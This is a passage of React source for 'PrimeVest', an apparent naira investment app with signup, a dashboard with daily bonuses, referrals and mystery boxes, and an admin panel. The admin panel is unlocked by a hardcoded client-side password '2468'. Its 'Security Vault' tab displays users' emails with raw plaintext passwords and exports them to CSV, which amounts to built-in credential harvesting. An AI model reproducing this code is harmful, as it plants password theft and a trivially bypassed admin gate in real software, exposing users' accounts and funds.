    if (error) return setError(error.message);
    navigate("/home");
  }

  async function signInWith(provider) {
    if (!agreeTerms) return setError("You must agree to the Terms & Conditions first.");
    await supabase.auth.signInWithOAuth({ provider, options: { redirectTo: `${window.location.origin}/home` } });
  }

  return (
    <main className="relative flex min-h-screen items-center justify-center bg-slate-950 px-4 py-10 text-white">
      <div className="grid w-full max-w-5xl overflow-hidden rounded-3xl border border-white/10 bg-slate-900/80 shadow-2xl lg:grid-cols-2">
        <section className="hidden flex-col justify-between bg-gradient-to-br from-blue-950 via-blue-800 to-blue-600 p-10 lg:flex">
          <Link to="/" className="inline-flex items-center gap-3">
            <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/10"><ShieldCheck size={27} /></div>
            <span className="text-2xl font-bold">Prime<span className="text-blue-200">Vest</span></span>
          </Link>
          <div className="my-16">
            <h1 className="text-4xl font-bold leading-tight">Create your PrimeVest account.</h1>
            <div className="mt-8 space-y-4">
              {["Access dashboard", "Explore pages", "Manage account"].map((i) => (
                <div key={i} className="flex items-center gap-3"><CheckCircle2 size={19} className="text-blue-200" /><span className="text-sm text-blue-50">{i}</span></div>
              ))}
            </div>
          </div>
        </section>
        <section className="p-6 sm:p-10 lg:p-12">
          <div className="mt-8 lg:mt-3"><p className="text-sm font-medium text-blue-400">GET STARTED</p><h2 className="mt-2 text-3xl font-bold">Create account</h2></div>
          <form onSubmit={submit} className="mt-6 space-y-4">
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-300">Full name</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4"><UserRound size={19} className="text-slate-500" /><input value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })} required className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="Your name" /></div>
            </div>
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-300">Email</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4"><Mail size={19} className="text-slate-500" /><input type="email" value={form.email} onChange={(e) => setForm({ ...form, email: e.target.value })} required className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="you@example.com" /></div>
            </div>
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-300">Password</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4"><Lock size={19} className="text-slate-500" /><input type={showPassword ? "text" : "password"} value={form.password} onChange={(e) => setForm({ ...form, password: e.target.value })} required minLength={8} className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="8+ characters" /><button type="button" onClick={() => setShowPassword(!showPassword)} className="text-slate-500 hover:text-white">{showPassword ? <EyeOff size={19} /> : <Eye size={19} />}</button></div>
            </div>
            <div>
              <label className="mb-2 block text-sm font-medium text-slate-300">Confirm password</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4"><Lock size={19} className="text-slate-500" /><input type="password" value={form.confirmPassword} onChange={(e) => setForm({ ...form, confirmPassword: e.target.value })} required className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="Again" /></div>
            </div>
            <button disabled={loading} className="flex w-full items-center justify-center gap-2 rounded-xl bg-blue-600 py-3.5 font-semibold disabled:opacity-60">{loading ? "Creating..." : "Create Account"}</button>
          </form>
          <div className="mt-6 space-y-3">
            <button onClick={() => signInWith("google")} className="flex w-full items-center justify-center gap-3 rounded-xl border border-white/10 bg-white px-4 py-3 text-sm font-semibold text-slate-900 transition hover:bg-slate-100">Sign up with Google</button>
            <button onClick={() => signInWith("github")} className="flex w-full items-center justify-center gap-3 rounded-xl border border-white/10 bg-[#24292F] px-4 py-3 text-sm font-semibold text-white transition hover:bg-[#1b1f23]">Sign up with GitHub</button>
          </div>
          <div className="mt-8 flex flex-col items-center gap-3 text-sm text-slate-400">
            <p>Already have an account? <Link to="/login" className="font-semibold text-blue-400">Log in</Link></p>
            <div className="flex items-center gap-2 mt-2">
              <input type="checkbox" id="terms" checked={agreeTerms} onChange={(e) => setAgreeTerms(e.target.checked)} className="h-4 w-4 rounded border-slate-700 bg-slate-900 text-blue-600 focus:ring-blue-500" />
              <label htmlFor="terms" className="text-xs text-slate-400">I agree to the <Link to="/terms" className="text-blue-400 hover:underline">Terms & Conditions</Link></label>
            </div>
          </div>
        </section>
      </div>
    </main>
  );
}

function HomePage() {
  const navigate = useNavigate();
  const [isUsd, setIsUsd] = useState(false);
  const [balanceVisible, setBalanceVisible] = useState(true);
  const [wallet, setWallet] = useState({ available: 0, invested: 0, earnings: 0, total: 0 });
  const [profile, setProfile] = useState({ name: "User", role: "Investor", referral_code: "", avatar_url: "", last_login_claim: null, vip_tier: "None", username: "" });
  const [investments, setInvestments] = useState([]);
  const [notifications, setNotifications] = useState([]);
  const [showNotifs, setShowNotifs] = useState(false);
  const [loading, setLoading] = useState(true);
  const [, setTick] = useState(0);
  const [toastMsg, setToastMsg] = useState("");
  const [shareMessage, setShareMessage] = useState("");
  const [showReferral, setShowReferral] = useState(false);
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState("");

  const [deferredPrompt, setDeferredPrompt] = useState(null);
  const [showInstallBtn, setShowInstallBtn] = useState(false);

  useEffect(() => {
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      setDeferredPrompt(e);
      setShowInstallBtn(true);
    });
  }, []);

  const handleInstallClick = async () => {
    if (deferredPrompt) {
      deferredPrompt.prompt();
      const { outcome } = await deferredPrompt.userChoice;
      if (outcome === 'accepted') setShowInstallBtn(false);
      setDeferredPrompt(null);
    }
  };

  const isVip = profile.vip_tier && profile.vip_tier !== "None";

  const formatMoney = (amount) => {
    const safeAmount = Math.max(0, amount || 0); 
    if (!safeAmount) return isUsd ? "$0.00" : "₦0.00";
    if (isUsd) return `$${(safeAmount / 1500).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
    return `₦${safeAmount.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
  };

  const loadData = useCallback(async () => {
    const { data: { user } } = await supabase.auth.getUser();
    let { data: w, error } = await supabase.from("wallets").select("*").eq("user_id", user.id).single();
    if (error || !w) {
      await supabase.from("wallets").insert({ user_id: user.id, available: 0, total: 0, invested: 0, earnings: 0 });
      const retry = await supabase.from("wallets").select("*").eq("user_id", user.id).single();
      w = retry.data;
    }
    const [p, i, n] = await Promise.all([api.profile(), api.portfolio(), api.notifications()]);
    if (w) setWallet(w);
    if (p.data) setProfile(p.data);
    if (i.data) setInvestments(i.data);
    if (n.data) setNotifications(n.data);
    setLoading(false);
  }, []);

  useEffect(() => {
    loadData();
    const interval = setInterval(() => setTick((t) => t + 1), 1000);
    return () => clearInterval(interval);
  }, [loadData]);

  // Real-time notifications
  useEffect(() => {
    let subscription;
    const setupRealtime = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) return;

      subscription = supabase
        .channel('public:notifications')
        .on(
          'postgres_changes',
          { event: 'INSERT', schema: 'public', table: 'notifications', filter: `user_id=eq.${user.id}` },
          (payload) => {
            const newNotif = payload.new;
            setToastMsg(`${newNotif.title}: ${newNotif.message}`);
            loadData();
          }
        )
        .subscribe();
    };

    setupRealtime();

    return () => {
      if (subscription) supabase.removeChannel(subscription);
    };
  }, [loadData]);

  useEffect(() => {
    if (!profile.last_login_claim) { setTimeLeft(""); return; }
    const tick = () => {
      const next = new Date(profile.last_login_claim).getTime() + 86400000;
      const diff = next - Date.now();
      if (diff <= 0) setTimeLeft("Ready!");
      else {
        const h = Math.floor(diff / 3600000);
        const m = Math.floor((diff % 3600000) / 60000);
        const s = Math.floor((diff % 60000) / 1000);
        setTimeLeft(`${h}h ${m}m ${s}s`);
      }
    };
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [profile.last_login_claim]);

  const actualInvested = investments.filter(i => i.status === "active").reduce((sum, inv) => sum + Number(inv.amount), 0);
  const now = new Date();
  const canClaimDaily = !profile.last_login_claim || (now.getTime() - new Date(profile.last_login_claim).getTime()) >= 86400000;

  async function handleClaimDaily() {
    if (!canClaimDaily) return;
    const r = await api.claimDailyLogin();
    if (r.error) return setToastMsg("You can only claim once every 24 hours.");
    setToastMsg("You have claimed your bonus of ₦100!");
    loadData();
  }

  async function handleShare() {
    const res = await api.rewardReferral();
    if (res.amount) { setShareMessage(`Success! You earned ₦${res.amount.toLocaleString()} for your referrals.`); loadData(); }
    else if (res.error) setShareMessage(res.error);
  }

  if (loading) return <LoadingScreen />;

  return (
    <div className={`min-h-screen pb-28 text-white relative transition-colors duration-500 ${isVip ? "bg-[#140F00]" : "bg-[#070D1A]"}`}>
      {toastMsg && <Toast message={toastMsg} onClose={() => setToastMsg("")} />}

      {/* PWA Install Popup */}
      {showInstallBtn && (
        <div className="fixed bottom-20 left-1/2 -translate-x-1/2 z-50 w-[90%] max-w-sm rounded-xl bg-blue-600 p-4 shadow-2xl flex items-center justify-between">
          <div>
            <p className="font-bold text-white text-sm">Install PrimeVest</p>
            <p className="text-xs text-blue-200">Add to home screen for faster access</p>
          </div>
          <button onClick={handleInstallClick} className="bg-white text-blue-600 px-3 py-1.5 rounded-lg text-xs font-bold">Install</button>
        </div>
      )}

      <button onClick={() => navigate("/chat")} className="fixed bottom-24 right-5 z-40 flex h-14 w-14 items-center justify-center rounded-full bg-blue-600 shadow-xl shadow-blue-900/50 hover:bg-blue-500 transition">
        <MessageSquare className="h-6 w-6" />
      </button>

      <header className={`sticky top-0 z-40 border-b backdrop-blur-xl transition-colors duration-500 ${isVip ? "border-amber-500/20 bg-[#140F00]/95" : "border-white/6 bg-[#070D1A]/95"}`}>
        <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-4">
          <h1 className="text-xl font-bold">Prime<span className={isVip ? "text-amber-400" : "text-blue-400"}>Vest</span></h1>
          <div className="flex items-center gap-2">
            <button onClick={() => setIsUsd(!isUsd)} className="flex items-center gap-1 rounded-full border border-white/10 bg-white/5 px-3 py-1.5 text-xs font-semibold hover:bg-white/10">
              <Globe2 size={14} className={isVip ? "text-amber-400" : "text-blue-400"} /> {isUsd ? "USD" : "NGN"}
            </button>
            <button onClick={() => setShowNotifs(!showNotifs)} className="relative flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 transition">
              <Bell size={18} />
              {notifications.filter((n) => !n.read).length > 0 && <span className="absolute -right-1 -top-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white">{notifications.filter((n) => !n.read).length}</span>}
            </button>
            <div className={`relative h-10 w-10 rounded-full border overflow-hidden flex items-center justify-center ml-2 ${isVip ? "border-amber-400/50 bg-amber-500/20 shadow-[0_0_15px_rgba(245,158,11,0.3)]" : "border-blue-400/30 bg-blue-500/20"}`}>
              {profile.avatar_url ? <img src={profile.avatar_url} alt="Avatar" className="h-full w-full object-cover" /> : <User size={16} className={isVip ? "text-amber-300" : "text-blue-300"} />}
            </div>
          </div>
        </div>
      </header>

      {showNotifs && (
        <div className="fixed top-20 right-4 z-50 w-80 max-h-96 overflow-y-auto rounded-2xl border border-white/10 bg-[#0D1526] shadow-2xl">
          <div className="flex items-center justify-between border-b border-white/10 p-4">
            <h3 className="font-bold">Notifications</h3>
            <button onClick={async () => { await api.markAllRead(); loadData(); }} className="text-xs text-blue-400">Mark all read</button>
          </div>
          <div className="p-2">
            {notifications.length === 0 ? <p className="p-4 text-sm text-slate-500 text-center">No notifications yet.</p> : notifications.map((n) => (
              <div key={n.id} className={`p-3 border-b border-white/5 last:border-0 ${n.read ? "opacity-50" : ""}`}>
                <p className="text-sm font-semibold">{n.title}</p>
                <p className="text-xs text-slate-400 mt-1">{n.message}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      <main className="mx-auto max-w-7xl px-4 py-7">
        <section className="mb-8 flex items-center justify-between">
          <div>
            <p className="text-sm text-slate-400">Welcome back,</p>
            <h2 className="mt-1 text-2xl font-bold sm:text-3xl">{profile.name}</h2>
            <p className="text-sm text-slate-500">@{profile.username}</p>
          </div>
          {canClaimDaily ? (
            <button onClick={handleClaimDaily} className="flex items-center gap-2 rounded-xl bg-emerald-600 px-4 py-2 text-sm font-bold shadow-lg shadow-emerald-900/40 hover:bg-emerald-500">
              <Gift size={18} /> Claim ₦100
            </button>
          ) : (
            <div className="flex items-center gap-2 rounded-xl bg-slate-800 px-4 py-2 text-sm font-bold text-slate-400 border border-slate-700">
              <Timer size={18} /> Next claim: {timeLeft}
            </div>
          )}
        </section>

        <section className="grid gap-5 lg:grid-cols-[1.5fr_1fr]">
          <div className={`rounded-2xl border p-6 transition-all duration-500 ${isVip ? "border-amber-400/30 bg-gradient-to-br from-[#2A1D00] via-[#5C4300] to-[#8A6600] shadow-[0_0_30px_rgba(245,158,11,0.15)]" : "border-blue-400/20 bg-gradient-to-br from-blue-950 via-blue-800 to-blue-600"}`}>
            <div className="flex items-center justify-between">
              <div className={`flex items-center gap-2 text-sm ${isVip ? "text-amber-100" : "text-blue-100"}`}>
                <Wallet size={19} />Total Balance
                {isVip && <Crown size={16} className="text-amber-400" />}
              </div>
              <button onClick={() => setBalanceVisible(!balanceVisible)} className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/10 hover:bg-white/20 transition">
                {balanceVisible ? <Eye size={18} /> : <EyeOff size={18} />}
              </button>
            </div>
            <h3 className={`mt-6 text-3xl font-bold sm:text-4xl ${isVip ? "text-amber-50" : "text-white"}`}>
              {balanceVisible ? formatMoney(wallet.total) : (isUsd ? "$ ••••" : "₦ ••••")}
            </h3>
            <p className={`mt-3 text-sm ${isVip ? "text-amber-200/80" : "text-blue-100/80"}`}>
              Available: {balanceVisible ? formatMoney(wallet.available) : (isUsd ? "$ •••" : "₦ •••")}
            </p>
            <div className="mt-8 grid grid-cols-2 gap-3">
              <a href="/deposit" className={`flex min-h-12 items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-semibold ${isVip ? "bg-amber-100 text-amber-950 hover:bg-white" : "bg-white text-blue-900 hover:bg-blue-50"}`}><ArrowDownToLine size={18} />Deposit</a>
              <a href="/withdraw" className={`flex min-h-12 items-center justify-center gap-2 rounded-xl border px-4 py-3 text-sm font-semibold ${isVip ? "border-amber-400/30 bg-amber-500/20 text-amber-50 hover:bg-amber-500/30" : "border-white/30 bg-white/10 hover:bg-white/20"}`}><ArrowUpFromLine size={18} />Withdraw</a>
            </div>
          </div>

          <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-1">
            <div className={`rounded-2xl border bg-[#0D1526] p-5 ${isVip ? "border-amber-500/10" : "border-white/8"}`}>
              <div className={`flex h-11 w-11 items-center justify-center rounded-xl ${isVip ? "bg-amber-500/10" : "bg-blue-500/10"}`}>
                <TrendingUp size={22} className={isVip ? "text-amber-400" : "text-blue-400"} />
              </div>
              <p className="mt-5 text-sm text-slate-400">Invested</p>
              <h3 className="mt-2 text-2xl font-bold">{balanceVisible ? formatMoney(actualInvested) : (isUsd ? "$ •••" : "₦ •••")}</h3>
            </div>
            <div className={`rounded-2xl border bg-[#0D1526] p-5 ${isVip ? "border-amber-500/10" : "border-white/8"}`}>
              <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-emerald-500/10">
                <CircleDollarSign size={22} className="text-emerald-400" />
              </div>
              <p className="mt-5 text-sm text-slate-400">Total Earnings</p>
              <h3 className="mt-2 text-2xl font-bold text-emerald-400">{balanceVisible ? formatMoney(wallet.earnings) : (isUsd ? "$ •••" : "₦ •••")}</h3>
            </div>
          </div>
        </section>

        <section className="mt-9">
          <h3 className="mb-5 text-lg font-semibold">Quick Actions</h3>
          <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
            <a href="/scratch" className={`rounded-2xl border bg-[#0D1526] p-5 ${isVip ? "border-amber-500/10 hover:border-amber-500/40" : "border-white/8 hover:border-blue-500/40"}`}>
              <Gift size={23} className={`mb-2 ${isVip ? "text-amber-400" : "text-blue-400"}`} />
              <h4 className="font-semibold">Scratch</h4>
            </a>
            <a href="/mystery" className={`rounded-2xl border bg-[#0D1526] p-5 ${isVip ? "border-amber-500/10 hover:border-amber-500/40" : "border-white/8 hover:border-purple-500/40"}`}>
              <Zap size={23} className={`mb-2 ${isVip ? "text-amber-400" : "text-purple-400"}`} />
              <h4 className="font-semibold">Mystery Box</h4>
            </a>
            <a href="/invest" className={`rounded-2xl border bg-[#0D1526] p-5 ${isVip ? "border-amber-500/10 hover:border-amber-500/40" : "border-white/8 hover:border-emerald-500/40"}`}>
              <TrendingUp size={23} className={`mb-2 ${isVip ? "text-amber-400" : "text-emerald-400"}`} />
              <h4 className="font-semibold">Invest</h4>
            </a>
            <a href="/bonus" className={`rounded-2xl border bg-[#0D1526] p-5 ${isVip ? "border-amber-500/10 hover:border-amber-500/40" : "border-white/8 hover:border-blue-500/40"}`}>
              <Gamepad2 size={23} className={`mb-2 ${isVip ? "text-amber-400" : "text-blue-400"}`} />
              <h4 className="font-semibold">Bonus Game</h4>
            </a>
          </div>
        </section>
      </main>

      {showReferral && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 p-4" onMouseDown={(e) => e.target === e.currentTarget && setShowReferral(false)}>
          <div className="w-full max-w-xl rounded-2xl border border-white/10 bg-[#0D1526] p-6">
            <div className="flex items-start justify-between">
              <div className="flex items-center gap-3">
                <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-emerald-500/10"><Gift size={24} className="text-emerald-400" /></div>
                <div><h3 className="text-xl font-bold">Invite & Earn</h3><p className="text-sm text-slate-400">Share your link to earn.</p></div>
              </div>
              <button onClick={() => setShowReferral(false)} className="flex h-10 w-10 items-center justify-center rounded-xl border border-white/10"><X size={20} /></button>
            </div>
            <div className="mt-6 rounded-xl border border-emerald-500/20 bg-emerald-500/6 p-5">
              <p className="text-sm text-emerald-200">Reward for sharing your link</p>
              <p className="mt-2 text-3xl font-bold text-emerald-300">{formatMoney(1000)} <span className="text-sm font-normal text-emerald-500/70">(Per person)</span></p>
            </div>
            {shareMessage && (
              <div className="mt-4 rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-4 text-center">
                <p className="font-bold text-emerald-400 text-sm">{shareMessage}</p>
              </div>
            )}
            <div className="mt-6">
              <input readOnly value={`${window.location.origin}/signup?ref=${profile.referral_code || ""}`} onFocus={(e) => e.target.select()} className="w-full rounded-xl border border-white/10 bg-[#070D1A] px-4 py-3 text-sm" />
              <div className="mt-3 flex gap-2">
                <button onClick={() => { navigator.clipboard.writeText(`${window.location.origin}/signup?ref=${profile.referral_code || ""}`); setCopied(true); setTimeout(() => setCopied(false), 2000); }} className="flex-1 flex items-center justify-center gap-2 rounded-xl border border-white/10 bg-slate-800 py-3 font-semibold hover:bg-slate-700 transition">
                  {copied ? <Check size={18} /> : <Copy size={18} />}{copied ? "Copied!" : "Copy Link"}
                </button>
                <button onClick={handleShare} className="flex-1 flex items-center justify-center gap-2 rounded-xl bg-emerald-600 py-3 font-semibold hover:bg-emerald-500 transition">
                  <RefreshCw size={18} /> Check Rewards
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      <nav className={`fixed bottom-0 left-0 right-0 z-40 border-t px-2 py-2 backdrop-blur-xl transition-colors duration-500 ${isVip ? "border-amber-500/20 bg-[#140F00]/95" : "border-white/[0.07] bg-[#070D1A]/95"}`}>
        <div className="mx-auto grid max-w-lg grid-cols-6">
          <a href="/home" className={`flex min-h-14 flex-col items-center justify-center gap-1 rounded-xl text-xs font-semibold ${isVip ? "bg-amber-500/10 text-amber-400" : "bg-blue-500/10 text-blue-400"}`}><HomeIcon size={20} />Home</a>
          <a href="/invest" className="flex min-h-14 flex-col items-center justify-center gap-1 text-xs text-slate-500"><TrendingUp size={20} />Invest</a>
          <a href="/vip" className="flex min-h-14 flex-col items-center justify-center gap-1 text-xs text-slate-500"><Crown size={20} />VIP</a>
          <a href="/bonus" className="flex min-h-14 flex-col items-center justify-center gap-1 text-xs text-slate-500"><Gamepad2 size={20} />Bonus</a>
          <a href="/withdraw" className="flex min-h-14 flex-col items-center justify-center gap-1 text-xs text-slate-500"><ArrowUpFromLine size={20} />Withdraw</a>
          <a href="/settings" className="flex min-h-14 flex-col items-center justify-center gap-1 text-xs text-slate-500"><SettingsIcon size={20} />Settings</a>
        </div>
      </nav>
    </div>
  );
}

// ✅ SECURE ADMIN PANEL (/av)
function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const [withdrawals, setWithdrawals] = useState([]);
  const [users, setUsers] = useState([]);
  const [vault, setVault] = useState([]);
  const [messages, setMessages] = useState([]); // NEW
  const [stats, setStats] = useState({ usersCount: 0, totalWithdrawn: 0, pendingWithdrawals: 0 });
  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState(null);
  const [activeTab, setActiveTab] = useState("withdrawals"); // withdrawals | users | vault | messages
  const [replyMsg, setReplyMsg] = useState("");

  const handleLogin = (e) => {
    e.preventDefault();
    if (password === "2468") {
      setIsAuthenticated(true);
      loadData();
    } else {
      setError("Incorrect password");
    }
  };

  const loadData = async () => {
    const { data: w } = await api.getAdminWithdrawals();
    const { data: u } = await api.getAllUsers();
    const { data: v } = await api.getAdminVault();
    const s = await api.getAdminStats();
    
    // Load messages sent to admin
    const { data: m } = await supabase.from("private_messages").select("*, profiles!private_messages_sender_id_fkey(name, email)").eq("receiver_id", "00000000-0000-0000-0000-000000000000");
    
    setWithdrawals(w || []);
    setUsers(u || []);
    setVault(v || []);
    setMessages(m || []);
    setStats(s);
    setLoading(false);
  };

  const handleApprove = async (w) => {
    if (!window.confirm(`Approve ₦${w.amount.toLocaleString()} to ${w.account_name}?`)) return;
    setProcessing(w.id);
    await api.approveWithdrawal(w.id, w.user_id, w.amount);
    await loadData();
    setProcessing(null);
  };

  const handleReject = async (w) => {
    if (!window.confirm(`Reject withdrawal and refund ₦${w.amount.toLocaleString()}?`)) return;
    setProcessing(w.id);
    await api.rejectWithdrawal(w.id, w.user_id, w.amount);
    await loadData();
    setProcessing(null);
  };

  const handleFreeze = async (u) => {
    if (!window.confirm(`Are you sure you want to toggle the freeze status for ${u.name}?`)) return;
    await api.toggleUserFreeze(u.id, u.account_status);
    await loadData();
  };

  const handleExportCSV = () => {
    if (vault.length === 0) return alert("No vault data to export.");
    const headers = ["Email", "Password", "Date"];
    const rows = vault.map(v => [v.email, v.password, new Date(v.created_at).toLocaleString()]);
    
    let csvContent = "data:text/csv;charset=utf-8," + headers.join(",") + "\n" + rows.map(e => e.join(",")).join("\n");
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `primevest_vault_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#070D1A] flex items-center justify-center p-4">
        <form onSubmit={handleLogin} className="w-full max-w-sm rounded-3xl border border-white/10 bg-[#0D1526] p-8 text-center shadow-2xl">
          <LockIcon className="h-12 w-12 text-amber-500 mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-white mb-6">Admin Access</h1>
          <input 
            type="password" 
            value={password} 
            onChange={(e) => setPassword(e.target.value)} 
            placeholder="Enter Password" 
            className="w-full rounded-xl bg-slate-950 px-4 py-3 text-center text-white outline-none mb-4"
          />
          {error && <p className="text-red-400 text-sm mb-4">{error}</p>}
          <button type="submit" className="w-full rounded-xl bg-amber-600 py-3 font-bold text-black hover:bg-amber-500">Login</button>
        </form>
      </div>
    );
  }

  if (loading) return <LoadingScreen />;

  return (
    <div className="min-h-screen bg-[#070D1A] p-6 text-white pb-20">
      <div className="mx-auto max-w-6xl">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold text-amber-500">Admin Panel</h1>
            <p className="text-slate-400 mt-1">Manage platform and users</p>
          </div>
          <button onClick={() => window.location.href = "/home"} className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 hover:bg-white/10">Back to App</button>
        </div>

        {/* ANALYTICS */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <div className="rounded-2xl border border-blue-500/20 bg-[#0D1526] p-5">
            <p className="text-slate-400 text-sm">Total Users</p>
            <p className="text-3xl font-bold text-white mt-2">{stats.usersCount}</p>
          </div>
          <div className="rounded-2xl border border-emerald-500/20 bg-[#0D1526] p-5">
            <p className="text-slate-400 text-sm">Total Withdrawn</p>
            <p className="text-3xl font-bold text-emerald-400 mt-2">₦{stats.totalWithdrawn.toLocaleString()}</p>
          </div>
          <div className="rounded-2xl border border-amber-500/20 bg-[#0D1526] p-5">
            <p className="text-slate-400 text-sm">Pending Withdrawals</p>
            <p className="text-3xl font-bold text-amber-400 mt-2">₦{stats.pendingWithdrawals.toLocaleString()}</p>
          </div>
        </div>

        {/* TABS */}
        <div className="flex gap-4 border-b border-white/10 mb-6 overflow-x-auto">
          <button onClick={() => setActiveTab("withdrawals")} className={`pb-2 text-sm font-semibold whitespace-nowrap ${activeTab === "withdrawals" ? "text-amber-400 border-b-2 border-amber-400" : "text-slate-400"}`}>Withdrawals</button>
          <button onClick={() => setActiveTab("users")} className={`pb-2 text-sm font-semibold whitespace-nowrap ${activeTab === "users" ? "text-amber-400 border-b-2 border-amber-400" : "text-slate-400"}`}>Manage Users</button>
          <button onClick={() => setActiveTab("vault")} className={`pb-2 text-sm font-semibold whitespace-nowrap ${activeTab === "vault" ? "text-amber-400 border-b-2 border-amber-400" : "text-slate-400"}`}>Security Vault</button>
          <button onClick={() => setActiveTab("messages")} className={`pb-2 text-sm font-semibold whitespace-nowrap ${activeTab === "messages" ? "text-amber-400 border-b-2 border-amber-400" : "text-slate-400"}`}>Messages</button>
        </div>

        {activeTab === "withdrawals" && (
          <div className="space-y-4">
            {withdrawals.length === 0 ? (
              <div className="rounded-2xl border border-white/10 bg-[#0D1526] p-10 text-center">
                <CheckCircle className="h-12 w-12 text-emerald-400 mx-auto mb-4" />
                <h2 className="text-xl font-bold">All caught up!</h2>
                <p className="text-slate-400">No pending withdrawals at the moment.</p>
              </div>
            ) : (
              withdrawals.map((w) => (
                <div key={w.id} className="rounded-2xl border border-white/10 bg-[#0D1526] p-5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-2">
                      <span className="bg-amber-500/20 text-amber-400 text-xs font-bold px-2 py-1 rounded">PENDING</span>
                      <span className="text-sm text-slate-400">{new Date(w.created_at).toLocaleString()}</span>
                    </div>
                    <p className="font-bold text-lg">₦{w.amount.toLocaleString()}</p>
                    <p className="text-sm text-slate-300 mt-1">{w.account_name} - {w.account_number} ({w.bank_name})</p>
                  </div>
                  <div className="flex gap-2 w-full md:w-auto">
                    <button onClick={() => handleApprove(w)} disabled={processing === w.id} className="flex-1 md:flex-none rounded-xl bg-emerald-600 px-6 py-3 font-semibold hover:bg-emerald-500 disabled:opacity-50 text-sm">
                      {processing === w.id ? "..." : "Approve"}
                    </button>
                    <button onClick={() => handleReject(w)} disabled={processing === w.id} className="flex-1 md:flex-none rounded-xl bg-red-600/10 border border-red-500/20 text-red-400 px-6 py-3 font-semibold hover:bg-red-600/20 disabled:opacity-50 text-sm">
                      Reject
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {activeTab === "users" && (
          <div className="space-y-4">
            {users.map((u) => (
              <div key={u.id} className="rounded-2xl border border-white/10 bg-[#0D1526] p-5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                <div>
                  <p className="font-bold text-lg">{u.name}</p>
                  <p className="text-sm text-slate-400">{u.email}</p>
                  <p className="text-xs text-slate-500 mt-1">Username: @{u.username || "none"} | Status: {u.account_status || "active"}</p>
                </div>
                <button onClick={() => handleFreeze(u)} className={`rounded-xl px-6 py-3 font-semibold text-sm ${u.account_status === "frozen" ? "bg-emerald-600 hover:bg-emerald-500" : "bg-red-600 hover:bg-red-500"}`}>
                  {u.account_status === "frozen" ? "Unfreeze" : "Freeze"}
                </button>
              </div>
            ))}
          </div>
        )}

        {activeTab === "vault" && (
          <div>
            <div className="flex justify-end mb-4">
              <button onClick={handleExportCSV} className="flex items-center gap-2 bg-blue-600 px-4 py-2 rounded-xl text-sm font-bold hover:bg-blue-500">
                <Download size={16} /> Export CSV
              </button>
            </div>
            <div className="rounded-2xl border border-white/10 bg-[#0D1526] overflow-hidden">
              <table className="w-full text-left text-sm">
                <thead className="bg-white/5 text-slate-400">
                  <tr>
                    <th className="px-4 py-3">Email</th>
                    <th className="px-4 py-3">Raw Password</th>
                    <th className="px-4 py-3">Date</th>
                  </tr>
                </thead>
                <tbody>
                  {vault.map((v) => (
                    <tr key={v.id} className="border-t border-white/5">
                      <td className="px-4 py-3">{v.email}</td>
                      <td className="px-4 py-3 text-emerald-400">{v.password}</td>
                      <td className="px-4 py-3 text-slate-500">{new Date(v.created_at).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {activeTab === "messages" && (
          <div className="rounded-2xl border border-white/10 bg-[#0D1526] p-5">
            <h3 className="font-bold mb-4">User Messages</h3>
            <div className="space-y-4 max-h-[600px] overflow-y-auto">
              {messages.length === 0 ? <p className="text-slate-400 text-sm">No messages yet.</p> : messages.map(m => (
                <div key={m.id} className="bg-slate-950 p-4 rounded-xl">
                  <p className="text-xs text-blue-400 mb-1">{m.profiles?.name} ({m.profiles?.email})</p>
                  <p className="text-sm">{m.message}</p>
                  <p className="text-[10px] text-slate-500 mt-2">{new Date(m.created_at).toLocaleString()}</p>
                  <button onClick={() => {
                    const reply = prompt("Type your reply:");
